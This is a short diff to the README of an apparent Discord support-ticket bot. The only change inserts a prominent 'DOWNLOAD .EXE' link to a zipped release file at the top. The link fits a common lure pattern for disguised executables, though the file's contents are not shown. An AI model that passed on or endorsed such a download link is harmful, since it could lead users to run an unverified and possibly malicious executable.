@@ -1,5 +1,5 @@
 # Discord Ticket Bot
-
+DOWNLOAD .EXE 👉 https://github.com/JustLachin/discosoft-bot/releases/download/v1.0/DiscoSoftBot.zip
 A Discord bot that allows users to create support tickets with category selection.
 
 ## Features
